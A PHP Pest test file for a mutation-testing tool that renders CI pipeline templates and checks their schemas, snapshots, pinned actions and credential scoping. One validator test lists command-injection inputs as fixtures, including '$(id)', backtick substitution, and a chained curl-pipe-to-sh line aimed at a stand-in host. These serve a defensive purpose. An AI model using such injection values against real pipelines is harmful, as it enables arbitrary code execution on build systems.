<?php

declare(strict_types=1);

use NightWorksIO\MutationGate\Adapter\Azure\AzurePlan;
use NightWorksIO\MutationGate\Adapter\Buildkite\BuildkitePlan;
use NightWorksIO\MutationGate\Adapter\GitLab\GitLabPlan;
use NightWorksIO\MutationGate\Core\CannotJudge;
use NightWorksIO\MutationGate\Core\Ci\BuildkiteStep;
use NightWorksIO\MutationGate\Core\Ci\CiTemplate;
use NightWorksIO\MutationGate\Core\Ci\GatePin;
use NightWorksIO\MutationGate\Core\Ci\GitHubWorkflow;
use NightWorksIO\MutationGate\Core\Ci\Printed;
use NightWorksIO\MutationGate\Core\Ci\TemplateValues;
use NightWorksIO\MutationGate\Core\Ci\Variables;
use NightWorksIO\MutationGate\Core\Ci\WhichShard;
use NightWorksIO\MutationGate\Core\Composer\Installed;
use NightWorksIO\MutationGate\Core\Config\BuiltinCiPlan;
use NightWorksIO\MutationGate\Core\Config\BuiltinStore;
use NightWorksIO\MutationGate\Core\Config\Ci;
use NightWorksIO\MutationGate\Core\Config\Listed;
use NightWorksIO\MutationGate\Core\File\Contents;
use NightWorksIO\MutationGate\Core\File\Path;
use NightWorksIO\MutationGate\Core\NotGiven;
use NightWorksIO\MutationGate\Tests\Support\Decoded;
use NightWorksIO\MutationGate\Tests\Support\Schema;
use NightWorksIO\MutationGate\Tests\Support\ShardedPlan;
use Symfony\Component\Yaml\Yaml;

/**
 * Each provider's published JSON Schema, fetched at a pinned commit and held to its SHA-256 (ADR-0015 decision 17),
 * by the directory that holds its templates:
 *
 * - github: SchemaStore's github-workflow.json (Apache-2.0), beside actionlint in CI;
 * - gitlab: gitlab-org/gitlab's app/assets/javascripts/editor/schema/ci.json (MIT);
 * - buildkite: buildkite/pipeline-schema's schema.json (MIT);
 * - circleci: CircleCI-Public/circleci-yaml-language-server's schema.json (Apache-2.0);
 * - azure: microsoft/azure-pipelines-vscode's service-schema.json (MIT);
 * - bitbucket: Bitbucket's published schema, which pins no version, so its digest says when it changed.
 *
 * Jenkins publishes no schema for a Jenkinsfile, so its template is held by its snapshot alone (ADR-0024 decision 6).
 */
const CI_SCHEMAS = [
    'github' => [
        'https://raw.githubusercontent.com/SchemaStore/schemastore/8b994c014937a9332f2fb53d993eb1a30705677c/src/schemas/json/github-workflow.json',
        'd10c9f4656e1bd5bc6727e9b35080e017dc167154726fca93da33c7a6bd1c4f3',
    ],
    'gitlab' => [
        'https://gitlab.com/gitlab-org/gitlab/-/raw/0b9ee9048163062fa2329b8cc8df52bb6c411afa/app/assets/javascripts/editor/schema/ci.json',
        'ca545816e585b0b2e17cb89a8782d1e93260d215c28c8ebd1427fb19e8fcea8b',
    ],
    'buildkite' => [
        'https://raw.githubusercontent.com/buildkite/pipeline-schema/08f40154be6603b1f19baf485d02be8b8f95433d/schema.json',
        'f5138ecff10e6d9faf54cc60942d9071d76c00cd4bf64a879a0e5d407d77e5f4',
    ],
    'circleci' => [
        'https://raw.githubusercontent.com/CircleCI-Public/circleci-yaml-language-server/58c59af74039362161f75f8317366391245652ba/schema.json',
        '404b5b520d36f9f01a72ee6b776f7f3fe13187e5ea8fd1b5d8a5cf31021b5992',
    ],
    'azure' => [
        'https://raw.githubusercontent.com/microsoft/azure-pipelines-vscode/9e40e814abd20917f273dd587497086f0476a563/service-schema.json',
        'f00a9630f6550204148634d9a13f634b5750a225559886effe09a751482f0459',
    ],
    'bitbucket' => [
        'https://api.bitbucket.org/schemas/pipelines-configuration',
        '9387b9d72352521be95652848b9148163c6fa4090e870efc87ce731b2ff80630',
    ],
];

/**
 * Each template a provider's published schema validates: all of them but Jenkins'.
 *
 * @return list<CiTemplate>
 */
function ciSchemaTemplates(): array
{
    $validated = [];

    foreach (CiTemplate::cases() as $template) {
        $validated = $template === CiTemplate::JenkinsPipeline ? $validated : [...$validated, $template];
    }

    return $validated;
}

/** What starts a comment line in a template: `//` in a Jenkinsfile, `#` in YAML. */
function ciCommentMark(CiTemplate $template): string
{
    return $template === CiTemplate::JenkinsPipeline ? '//' : '#';
}

/** The schema a provider's templates are validated against, by the directory that holds them. */
function ciSchema(string $provider): string
{
    return Schema::fetched(...CI_SCHEMAS[$provider]);
}

/**
 * The last item of a Bitbucket pipeline, by its path under `pipelines`, in a rendered template's JSON; none where
 * the pipeline is not there.
 *
 * @return array<array-key, mixed>
 */
function bitbucketLastStep(string $json, string ...$pipeline): array
{
    $items = Decoded::at($json, 'pipelines', ...$pipeline);
    $last = is_array($items) && $items !== [] ? array_last($items) : [];

    return is_array($last) ? $last : [];
}

/** A rendered template's YAML, as the JSON a schema validates. */
function ciTemplateJson(string $yaml): string
{
    return (string) json_encode(Yaml::parse($yaml));
}

/**
 * A YAML node with each of Azure's `${{ if }}` insertions expanded as Azure expands a template: its keys or items
 * taken in where the condition holds, and left out where it does not.
 */
function azureExpanded(mixed $node, bool $holds): mixed
{
    $expanded = [];

    foreach (is_array($node) ? $node : [] as $key => $value) {
        $expanded = azureTaken($expanded, $key, $value, $holds);
    }

    return is_array($node) ? $expanded : $node;
}

/** A rendered Azure template as the JSON a schema validates, with each insertion expanded one way. */
function azureExpansion(string $yaml, bool $holds): string
{
    return (string) json_encode(azureExpanded(Yaml::parse($yaml), $holds));
}

/**
 * A node's entries; none for a scalar.
 *
 * @return array<array-key, mixed>
 */
function azureList(mixed $node): array
{
    return is_array($node) ? $node : [];
}

/** The condition an insertion's key holds, a mapping's own or a list item's only one; empty for any other entry. */
function azureInsertion(int|string $key, mixed $value): string
{
    $named = match (true) {
        is_string($key) => $key,
        is_array($value) && count($value) === 1 => array_key_first($value),
        default => '',
    };

    return is_string($named) && str_starts_with($named, '${{ if ') ? $named : '';
}

/**
 * What an expansion holds once this entry is taken in: the entry itself, or what its insertion holds.
 *
 * @param  array<array-key, mixed> $expanded
 * @return array<array-key, mixed>
 */
function azureTaken(array $expanded, int|string $key, mixed $value, bool $holds): array
{
    $insertion = azureInsertion($key, $value);
    $inserted = is_array($value) && array_key_exists($insertion, $value) ? $value[$insertion] : $value;

    return match (true) {
        $insertion === '' && is_int($key) => [...$expanded, azureExpanded($value, $holds)],
        $insertion === '' => [...$expanded, $key => azureExpanded($value, $holds)],
        ! $holds => $expanded,
        is_string($key) => [...$expanded, ...azureList(azureExpanded($value, $holds))],
        default => [...$expanded, ...array_values(azureList(azureExpanded($inserted, $holds)))],
    };
}

/**
 * The gate as Composer lists it installed from a commit of its main branch, the one
 * tests/Fixtures/CiTemplates/installed.json names: the snapshots pin it, and a pin must name a real commit.
 */
function ciTemplateGate(): GatePin
{
    $installed = Installed::decode(
        Contents::of((string) file_get_contents(Schema::at('tests/Fixtures/CiTemplates/installed.json'))),
        Path::of('vendor/composer/installed.json'),
    );

    return $installed instanceof Installed ? GatePin::in($installed) : GatePin::unknown();
}

/**
 * A template, as a project on PHP 8.5, with the default branch trunk, the runner pest and every default, fills it
 * in for the CI whose directory holds it.
 */
function ciTemplateRendered(CiTemplate $template): string
{
    [$ci] = explode('/', $template->value);
    $values = TemplateValues::of(
        '8.5',
        'trunk',
        ciTemplateGate(),
        'pest',
        Ci::none()->check(),
        CiTemplate::included(BuiltinCiPlan::from($ci), Ci::none()),
    );
    $text = (string) file_get_contents(Schema::at(sprintf('resources/ci/%s', $template->value)));

    return $values instanceof TemplateValues ? $values->rendered($text) : throw new LogicException($values->why());
}

it('renders each CI\'s templates, the GitHub one as the estimate or the request picks it', function (): void {
    $single = GitHubWorkflow::Single;

    expect(CiTemplate::for(BuiltinCiPlan::GitHub, $single))->toEqual(Listed::of(CiTemplate::GitHubSingle))
        ->and(CiTemplate::for(BuiltinCiPlan::GitHub, GitHubWorkflow::Sharded))->toEqual(Listed::of(CiTemplate::GitHubSharded))
        ->and(CiTemplate::for(BuiltinCiPlan::GitLab, $single))->toEqual(Listed::of(CiTemplate::GitLabTemplate, CiTemplate::GitLabJobs))
        ->and(CiTemplate::for(BuiltinCiPlan::Buildkite, $single))
        ->toEqual(Listed::of(CiTemplate::BuildkitePipeline, CiTemplate::BuildkiteUpload))
        ->and(CiTemplate::for(BuiltinCiPlan::CircleCi, $single))->toEqual(Listed::of(CiTemplate::CircleCi))
        ->and(CiTemplate::for(BuiltinCiPlan::Azure, $single))->toEqual(Listed::of(CiTemplate::AzureJobs, CiTemplate::AzureInclude))
        ->and(CiTemplate::for(BuiltinCiPlan::Bitbucket, $single))->toEqual(Listed::of(CiTemplate::BitbucketPipelines))
        ->and(CiTemplate::for(BuiltinCiPlan::Jenkins, $single))->toEqual(Listed::of(CiTemplate::JenkinsPipeline))
        ->and(CiTemplate::for(BuiltinCiPlan::Json, $single))->toEqual(Listed::of());
});

it('names the file of the gate\'s jobs that the lines it prints pull in, where the CI\'s definition is more than one', function (): void {
    $ci = Ci::of(gitlabTemplate: Path::of('ci/gate.yml'));

    expect(array_map(
        static fn(BuiltinCiPlan $plan): string => ($included = CiTemplate::included($plan, $ci)) instanceof Path
            ? $included->value()
            : 'none',
        BuiltinCiPlan::cases(),
    ))->toBe(['none', 'ci/gate.yml', '.buildkite/mutation-gate.yml', 'none', '.azure/mutation-gate.yml', 'none', 'none', 'none']);
});

it('writes a definition to a file of its own, and prints one that belongs in a file the CI reads', function (): void {
    $ci = Ci::of(gitlabTemplate: Path::of('ci/gate.yml'), jenkinsDefinition: Path::of('ci/Jenkinsfile'));

    expect(array_map(
        static fn(CiTemplate $template): string => ($where = $template->destination($ci)) instanceof Printed
            ? sprintf('printed into %s', $where->file())
            : $where->value(),
        CiTemplate::cases(),
    ))->toBe([
        '.github/workflows/mutation.yml',
        '.github/workflows/mutation.yml',
        'ci/gate.yml',
        'printed into .gitlab-ci.yml',
        '.buildkite/mutation-gate.yml',
        'printed into the pipeline Buildkite runs',
        'printed into .circleci/config.yml',
        '.azure/mutation-gate.yml',
        'printed into azure-pipelines.yml',
        'printed into bitbucket-pipelines.yml',
        'printed into ci/Jenkinsfile',
    ]);
    expect(CiTemplate::JenkinsPipeline->destination(Ci::none()))->toEqual(Printed::into('Jenkinsfile'));
});

it('fills in every placeholder', function (CiTemplate $template): void {
    expect(ciTemplateRendered($template))->not->toContain('%%');
})->with(CiTemplate::cases());

it('renders YAML the provider\'s published schema accepts', function (CiTemplate $template): void {
    [$provider] = explode('/', $template->value);
    $rendered = ciTemplateRendered($template);
    $expansions = [ciTemplateJson($rendered)];

    if ($provider === 'azure') {
        $expansions = [azureExpansion($rendered, holds: true), azureExpansion($rendered, holds: false)];
    }

    foreach ($expansions as $json) {
        expect(Schema::errors($json, ciSchema($provider)))->toBe([]);
    }
})->with(ciSchemaTemplates());

it('renders each template as its snapshot', function (CiTemplate $template): void {
    expect(ciTemplateRendered($template))->toBe((string) file_get_contents(Schema::at(sprintf('tests/Fixtures/CiTemplates/%s', $template->value))));
})->with(CiTemplate::cases());

it('pins each action a template uses by the commit the package\'s own workflows use, and the gate by its own', function (
    CiTemplate $template,
): void {
    $pins = [];

    $workflows = glob(Schema::at('.github/workflows/*.yml'));

    foreach (is_array($workflows) ? $workflows : [] as $workflow) {
        preg_match_all('/uses: ([\w.-]+\/[\w.-]+)@([0-9a-f]{40}) # (\S+)/', (string) file_get_contents($workflow), $used, PREG_SET_ORDER);

        foreach ($used as [, $action, $commit, $tag]) {
            $pins[$action] = sprintf('%s # %s', $commit, $tag);
        }
    }

    $text = (string) file_get_contents(Schema::at(sprintf('resources/ci/%s', $template->value)));
    preg_match_all('/uses: ([\w.-]+\/[\w.-]+)@(\S+ # \S+)/', $text, $templated, PREG_SET_ORDER);
    $others = array_filter($templated, static fn(array $use): bool => $use[1] !== 'nightworksio/php-mutation-gate');
    $gate = substr_count($text, '@%%pin%%');

    expect(count($others) + $gate)->toBe(substr_count($text, 'uses: '));

    foreach ($others as [, $action, $pin]) {
        expect($pins[$action] ?? 'not used by the package\'s workflows')->toBe($pin);
    }
})->with(CiTemplate::cases());

it('refuses a value a shell or YAML would read as code, from whichever setting it comes', function (
    string $branch,
    string $runner,
    string $template,
    string $check,
    string $why,
): void {
    expect(TemplateValues::of('8.5', $branch, GatePin::unknown(), $runner, $check, Path::of($template)))
        ->toEqual(CannotJudge::because(sprintf(
            '%s cannot go into a CI definition, where a shell or YAML reads it as code. %s',
            ...explode(' | ', $why),
        )));
})->with([
    'a command in the branch' => ['main$(id)', 'pest', 'x.yml', 'c', 'The default branch "main$(id)" | Set ci.defaultBranch to a name of letters, digits and ._/-.'],
    'a command chained after the branch' => ['x;curl${IFS}evil.sh|sh', 'pest', 'x.yml', 'c', 'The default branch "x;curl${IFS}evil.sh|sh" | Set ci.defaultBranch to a name of letters, digits and ._/-.'],
    'a quote in the branch' => ["it's", 'pest', 'x.yml', 'c', 'The default branch "it\'s" | Set ci.defaultBranch to a name of letters, digits and ._/-.'],
    'backticks in the branch' => ['a`id`', 'pest', 'x.yml', 'c', 'The default branch "a`id`" | Set ci.defaultBranch to a name of letters, digits and ._/-.'],
    'a quote in the runner' => ['main', "pest'", 'x.yml', 'c', 'The runner "pest\'" | Choose a runner by a name of letters, digits and ._-.'],
    'a quote in the template' => ['main', 'pest', "a'b.yml", 'c', 'The file "a\'b.yml" | Set ci.gitlab.template to a path of letters, digits and ._/-.'],
    'a command in the check' => ['main', 'pest', 'x.yml', 'x$(id)', 'The check "x$(id)" | Set ci.check to a name of letters, digits, spaces and ._/-.'],
]);

it('takes a runner a class names, and a check with spaces', function (): void {
    expect(TemplateValues::of('8.5', 'release/2.x', GatePin::unknown(), '\\Acme\\Runner', 'mutation / verdict', Path::of('ci/gate.yml')))
        ->toBeInstanceOf(TemplateValues::class);
});

it('leaves the file of the gate\'s jobs unchecked and unfilled where the CI\'s definition is one file', function (): void {
    $values = TemplateValues::of('8.5', 'main', GatePin::unknown(), 'pest', 'c', NotGiven::value());

    expect($values)->toBeInstanceOf(TemplateValues::class)
        ->and($values instanceof TemplateValues ? $values->rendered('%%included%% %%runner%%') : '')->toBe('%%included%% pest');
});

it('quotes every value a project gives wherever a template holds it, a ref\'s branch within its quoted ref, and runs none in a shell line', function (
    CiTemplate $template,
): void {
    $lines = explode("\n", (string) file_get_contents(Schema::at(sprintf('resources/ci/%s', $template->value))));
    $unquoted = array_filter($lines, static fn(string $line): bool => ! str_starts_with(trim($line), ciCommentMark($template))
        && preg_match("/(?<!')(?<!'refs\/heads\/)%%(branch|runner|included|check)%%|%%(branch|runner|included|check)%%(?!')/", $line) === 1);

    expect(array_values($unquoted))->toBe([]);
})->with(CiTemplate::cases());

it('names the one-step action\'s job for the check the verdict reports under', function (): void {
    expect(ciTemplateRendered(CiTemplate::GitHubSingle))->toContain(sprintf("    name: '%s'\n", Ci::none()->check()));
});

it('keeps a status check in every condition of Azure\'s jobs, so no step runs after a cancel', function (): void {
    preg_match_all('/condition: (.+)$/m', ciTemplateRendered(CiTemplate::AzureJobs), $conditions);

    expect($conditions[1])->not->toBe([]);

    foreach ($conditions[1] as $condition) {
        expect($condition)->toMatch('/\b(succeeded|succeededOrFailed|failed|always|canceled)\(\)/');
    }
});

it('reads the plan\'s matrix from the output the Azure plan sets, and each leg\'s shard from its variable', function (): void {
    $jobs = ciTemplateRendered(CiTemplate::AzureJobs);

    expect($jobs)->toContain("        name: gate\n")
        ->and($jobs)->toContain(sprintf("dependencies.mutation_plan.outputs['gate.%s']", AzurePlan::OUTPUT))
        ->and($jobs)->toContain(sprintf("ne(variables.%s, '')", WhichShard::VARIABLE))
        ->and($jobs)->toContain(sprintf('mutation-results-$(%s)', WhichShard::VARIABLE));
});

it('drops every variable the bucket store reads in the Azure plan step, and in the verdict step of a fork\'s build, before the gate runs', function (): void {
    $variables = implode(' ', [...BuiltinStore::S3->variables()]);
    $jobs = ciTemplateRendered(CiTemplate::AzureJobs);
    $step = static function (string $gate) use ($jobs): string {
        $before = substr($jobs, 0, (int) strpos($jobs, $gate));

        return substr($before, (int) strrpos($before, '- bash: |'));
    };

    expect($step('vendor/bin/mutation-gate plan'))->toContain(sprintf("          unset %s\n", $variables))
        ->and($step('vendor/bin/mutation-gate verdict'))
        ->toContain(sprintf('if [ "${SYSTEM_PULLREQUEST_ISFORK:-}" = "True" ]; then unset %s; fi', $variables));
});

it('hands Azure\'s keys to the verdict alone, from the variable group, on a push, a schedule or a manual run of the default branch', function (): void {
    $jobs = ciTemplateRendered(CiTemplate::AzureJobs);
    $trusted = "\${{ if and(in(variables['Build.Reason'], 'IndividualCI', 'BatchedCI', 'Schedule', 'Manual'), eq(variables['Build.SourceBranch'], 'refs/heads/trunk')) }}:";
    $verdict = substr($jobs, (int) strpos($jobs, '- job: mutation_verdict'), (int) strpos($jobs, '- job: mutation_ledger') - (int) strpos($jobs, '- job: mutation_verdict'));

    $group = sprintf('group: %s', CiTemplate::keyHolder());

    expect(substr_count($jobs, $group))->toBe(1)
        ->and(substr_count($jobs, 'AWS_ACCESS_KEY_ID: $(AWS_ACCESS_KEY_ID)'))->toBe(1)
        ->and($verdict)->toContain(sprintf("      - %s\n          - %s\n", $trusted, $group))
        ->and($verdict)->toContain(sprintf("        %s\n          env:\n            AWS_ACCESS_KEY_ID: $(AWS_ACCESS_KEY_ID)\n", $trusted));
});

it('names every variable the bucket store reads on Azure DevOps\' page, where a fork\'s build drops them', function (): void {
    $page = (string) file_get_contents(Schema::at('.docs/guide/ci/azure-devops.md'));
    $named = implode(', ', array_map(static fn(string $variable): string => sprintf('`%s`', $variable), [...BuiltinStore::S3->variables()]));

    expect($page)->toContain(sprintf('drop every variable the S3 store reads, %s,', $named));
});

it('refuses by Bitbucket\'s schema a deployment on a final step, so a verdict that holds the keys is a step', function (): void {
    $pipelines = ciTemplateRendered(CiTemplate::BitbucketPipelines);
    $final = static fn(string $deployment): string => str_replace(
        "      - final: *mutation-verdict\n",
        sprintf("      - final:\n          <<: *mutation-verdict\n%s", $deployment),
        $pipelines,
    );
    $merged = $final('');
    $deploying = $final(sprintf("          deployment: '%s'\n", CiTemplate::keyHolder()));

    expect($merged)->not->toBe($pipelines)
        ->and(Schema::errors(ciTemplateJson($merged), ciSchema('bitbucket')))->toBe([])
        ->and(Schema::errors(ciTemplateJson($deploying), ciSchema('bitbucket')))->not->toBe([]);
});

it('deploys only the default branch\'s and the full run\'s verdicts, each the last step, and makes a pull request\'s verdict final', function (): void {
    $json = ciTemplateJson(ciTemplateRendered(CiTemplate::BitbucketPipelines));
    $verdict = ['name' => 'mutation: verdict', 'clone' => ['depth' => 'full'], 'script' => [
        'composer install --no-interaction --no-progress',
        'vendor/bin/mutation-gate verdict --plan=.mutation-gate/plan.json --results=.mutation-gate/results',
    ]];
    $deployed = ['step' => [...$verdict, 'deployment' => CiTemplate::keyHolder()]];

    expect(bitbucketLastStep($json, 'branches', 'trunk'))->toBe($deployed)
        ->and(bitbucketLastStep($json, 'custom', 'mutation-full'))->toBe($deployed)
        ->and(bitbucketLastStep($json, 'pull-requests', '**'))->toBe(['final' => $verdict]);
});

it('cuts as many shards as each Bitbucket pipeline runs parallel steps', function (string ...$pipeline): void {
    $json = ciTemplateJson(ciTemplateRendered(CiTemplate::BitbucketPipelines));
    $script = Decoded::at($json, 'pipelines', ...$pipeline, ...[0, 'step', 'script']);
    $parallel = Decoded::at($json, 'pipelines', ...$pipeline, ...[1, 'parallel']);

    $shards = preg_match('/--shards=(\d+)/', (string) json_encode($script), $cut) === 1 ? (int) $cut[1] : 0;

    expect($shards)->toBeGreaterThan(0)
        ->and(is_array($parallel) ? count($parallel) : 0)->toBe($shards);
})->with([
    'the default branch' => ['branches', 'trunk'],
    'a pull request' => ['pull-requests', '**'],
    'the full run' => ['custom', 'mutation-full'],
]);

it('hands CircleCI\'s context to the verdict alone, in the workflow that runs on a push, a schedule or an API trigger of the default branch', function (): void {
    $rendered = ciTemplateRendered(CiTemplate::CircleCi);
    $json = ciTemplateJson($rendered);
    $trusted = ['and' => [
        ['or' => [
            ['equal' => ['webhook', '<< pipeline.trigger_source >>']],
            ['equal' => ['scheduled_pipeline', '<< pipeline.trigger_source >>']],
            ['equal' => ['api', '<< pipeline.trigger_source >>']],
        ]],
        ['equal' => ['trunk', '<< pipeline.git.branch >>']],
    ]];

    expect(Decoded::at($json, 'workflows'))->toHaveCount(2)
        ->and(Decoded::at($json, 'workflows', 'mutation-store', 'when'))->toBe($trusted)
        ->and(Decoded::at($json, 'workflows', 'mutation', 'unless'))->toBe($trusted)
        ->and(Decoded::at($json, 'workflows', 'mutation-store', 'jobs', 2, 'mutation-verdict', 'context'))
        ->toBe([CiTemplate::keyHolder()])
        ->and(substr_count($rendered, "          context:\n"))->toBe(1);
});

it('leaves the store\'s keys in GitLab\'s jobs to the verdict that keeps them alone, and hands the child the parent\'s source', function (): void {
    expect(ciTemplateRendered(CiTemplate::GitLabTemplate))->toContain(sprintf(
        "  before_script:\n    - '[ \"\$CI_JOB_NAME\" = \"%s\" ] || unset %s'\n    - composer install",
        GitLabPlan::STORE_VERDICT,
        implode(' ', [...BuiltinStore::S3->variables()]),
    ))
        ->and(ciTemplateRendered(CiTemplate::GitLabJobs))->toContain(sprintf("    %s: \$CI_PIPELINE_SOURCE\n", GitLabPlan::SOURCE));
});

it('names in Buildkite\'s pipeline and its page the cluster secrets the verdict fetches, and drops the keys before the plan installs', function (): void {
    $steps = Decoded::at(BuildkitePlan::of(BuildkiteStep::none(), Variables::of([]))->publish(ShardedPlan::of(0))->text(), 'steps', 1, 'command');
    preg_match_all('/secret get (\S+)\)/', implode("\n", array_filter(is_array($steps) ? $steps : [], is_string(...))), $secrets);
    $pipeline = ciTemplateRendered(CiTemplate::BuildkitePipeline);
    $page = (string) file_get_contents(Schema::at('.docs/guide/ci/buildkite.md'));

    expect($secrets[1])->toHaveCount(2)
        ->and($pipeline)->toContain(sprintf("      - unset %s\n      - composer install", implode(' ', [...BuiltinStore::S3->variables()])));

    foreach ($secrets[1] as $secret) {
        expect(str_replace("\n# ", ' ', $pipeline))->toContain($secret)
            ->and($page)->toContain(sprintf('`%s`', $secret));
    }
});

it('names the deployment environment that holds the keys on Bitbucket\'s page', function (): void {
    expect((string) file_get_contents(Schema::at('.docs/guide/ci/bitbucket.md')))
        ->toContain(sprintf('deployment environment `%s`', CiTemplate::keyHolder()));
});

it('reads the plan Jenkins prints with readJSON, and hands parallel one closure per shard, named in its variable', function (): void {
    $jenkinsfile = ciTemplateRendered(CiTemplate::JenkinsPipeline);
    $jenkins = BuiltinCiPlan::Jenkins->value;

    expect($jenkinsfile)->toContain(sprintf('vendor/bin/mutation-gate plan --ci=%s $base > .mutation-gate/shards.json', $jenkins))
        ->and($jenkinsfile)->toContain("for (shard in readJSON(file: '.mutation-gate/shards.json').shards) {")
        ->and($jenkinsfile)->toContain(sprintf('withEnv(["%s=${number}"]) {', WhichShard::VARIABLE))
        ->and($jenkinsfile)->toContain(sprintf("sh 'vendor/bin/mutation-gate run --ci=%s --plan=.mutation-gate/plan.json'", $jenkins))
        ->and($jenkinsfile)->toContain("            parallel shards\n");
});

it('runs Jenkins\' verdict in post, always, and binds the keys there alone, on the default branch alone', function (): void {
    $jenkinsfile = ciTemplateRendered(CiTemplate::JenkinsPipeline);
    [$id, $secret] = [...BuiltinStore::S3->variables()];
    $post = substr($jenkinsfile, (int) strpos($jenkinsfile, "\n  post {\n    always {\n"));
    $binding = sprintf(
        "withCredentials([usernamePassword(credentialsId: '%s', usernameVariable: '%s', passwordVariable: '%s')]) {",
        CiTemplate::keyHolder(),
        $id,
        $secret,
    );

    expect($post)->toContain(sprintf(
        "def verdict = 'vendor/bin/mutation-gate verdict --ci=%s --plan=.mutation-gate/plan.json --results=.mutation-gate/results'",
        BuiltinCiPlan::Jenkins->value,
    ))
        ->and(substr_count($jenkinsfile, 'withCredentials('))->toBe(1)
        ->and($post)->toContain(sprintf(
            "if (env.BRANCH_NAME == env.MUTATION_GATE_DEFAULT_BRANCH && env.CHANGE_ID == null) {\n          %s",
            $binding,
        ));
});

it('names the credentials that hold the keys on Jenkins\' page', function (): void {
    expect((string) file_get_contents(Schema::at('.docs/guide/ci/jenkins.md')))
        ->toContain(sprintf('the credentials `%s`', CiTemplate::keyHolder()));
});
